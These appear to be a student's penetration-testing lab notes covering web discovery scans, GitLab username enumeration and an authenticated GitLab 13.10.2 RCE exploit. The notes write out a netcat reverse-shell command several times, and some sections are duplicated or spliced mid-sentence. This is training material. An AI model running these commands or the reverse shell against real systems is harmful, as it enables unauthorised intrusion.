
## APP Discovery
```shell-session
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

sudo nmap --open -sV 10.129.201.50
```


Hosts with `dev` as part of the FQDN are worth noting down as they may be running untested features or have things like debug mode enabled

 - note: Interesting hosts:
 - `gitlab-dev.ad.someorg.local`, dev 
 - Screenshotting
`eyewit`
 ```shell-session
eyewitness --web -x web_discovery.xml -d northly.local_eyewitness
```

`aq`
```shell-session
 cat web_discovery.xml | ./aquatone -nmap
```
## Interpreting the Results

it is worth reviewing the entire thing and poking at/researching any applications we are unfamiliar with

Note down high value targets eg.: tomcat

---

# 1 fingerprint version 
`/help`

## enumeration
visit `/explore` check repos
# 1 user enumeration through register
https://www.exploit-db.com/exploits/49821

```shell-session
./gitlab_userenum.sh --url http://gitlab.ad.someorg.local:8081/ --userlist users.txt
```


![](https://academy.hackthebox.com/storage/modules/113/gitlab_signup.png)

We can also use the registration form to enumerate valid users (more on this in the next section). If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as `Dehashed` as seen in the osTicket section. Here we can see the user `root` is taken. We'll see another example of username enumeration in the next section. On this particular instance of GitLab (and likely others), we can also enumerate emails. If we try to register with an email that has already been taken, we will get the error `1 error prohibited this user from being saved: Email has already been taken`. As of the time of writing, this username enumeration technique works with the latest version of GitLab. Even if the `Sign-up enabled` checkbox is cleared within the settings page under `Sign-up restrictions`, we can still browse to the `/users/sign_up` page and enumerate users but will not be able to register a user.

 Some mitigations can be put in place for this, such as enforcing 2FA on all user accounts, using `Fail2Ban` to block failed login attempts which are indicative of brute-forcing attacks, and even restricting which IP addresses can access a GitLab instance if it must be accessible outside of the internal corporate network.

# 3 source code review for secrets
# 4 Authenticated Remote Code Execution

Remote code execution vulnerabilities are typically considered the "cream of the crop" as access to the underlying server will likely grant us access to all data that resides on it (though we may need to escalate privileges first) and can serve as a foothold into the network for us to launch further attacks against other systems and potentially result in full network compromise. GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version. We can use this [exploit](https://www.exploit-db.com/exploits/49951) to achieve RCE.

As this is authenticated remote code execution, we first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.


```shell-session
python3 gitlab_13_10_2_rce.py -t http://gitlab.ad.someorg.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

```shell-session
$ python3 gitlab_13_10_2_rce.py -t http://gitlab.ad.someorg.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```
The only way to footprint the GitLab version number in use is by browsing to the `/help` page when logged in. If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version. If we cannot register an account, we may have to try a low-risk exploit such as [this](https://www.exploit-db.com/exploits/49821). We do not recommend launching various exploits at an application, so if we have no way to enumerate the version number (such as a date on the page, the first public commit, or by registering a user), then we should stick to hunting for secrets and not try multiple exploits against it blindly. There have been a few serious exploits against GitLab [12.9.0](https://www.exploit-db.com/exploits/48431) and GitLab [11.4.7](https://www.exploit-db.com/exploits/49257) in the past few years as well as GitLab Community Edition [13.10.3](https://www.exploit-db.com/exploits/49821), [13.9.3](https://www.exploit-db.com/exploits/49944), and [13.10.2](https://www.exploit-db.com/exploits/49951).

We can also use the registration form to enumerate valid users


Secrets
https://github.com/tillson/git-hound
## Authenticated Remote Code Execution

Remote code execution vulnerabilities are typically considered the "cream of the crop" as access to the underlying server will likely grant us access to all data that resides on it (though we may need to escalate privileges first) and can serve as a foothold into the network for us to launch further attacks against other systems and potentially result in full network compromise. GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version. W
```shell-session
python3 gitlab_13_10_2_rce.py -t http://gitlab.ad.someorg.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```e can use this [exploit](https://www.exploit-db.com/exploits/49951) to achieve RCE.
```

---

### lab

add hosts to `/etc/hosts`
```shell-session
$ IP=10.129.42.195
$ printf "%s\t%s\n\n" "$IP" "app.ad.someorg.local dev.ad.someorg.local blog.ad.someorg.local" | sudo tee -a /etc/hosts
```

```
IP = 10.129.37.53
printf "%s\t%s\n\n" "$IP" 
```

`inital scan`
```
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

`enumerate the host running the web server`
```
┌──(demise㉿ATTACKBOX)-[~]
└─$ sudo nmap 10.129.37.53 --open -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 19:26 EST
Nmap scan report for app.ad.someorg.local (10.129.37.53)
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

`eyewitness`
```
eyewitness --web -x web_discovery.xml -d northly.local_eyewitness
```

![](Pasted%20image%2020250211024431.png)

![](Pasted%20image%2020250211024601.png)

### aquatone
```
 cat web_discovery.xml | ./aquatone -nmap
```
![](Pasted%20image%2020250211025515.png)
## Interpreting the Results
[http://drupal-dev.ad.someorg.local](http://drupal-dev.ad.someorg.local)

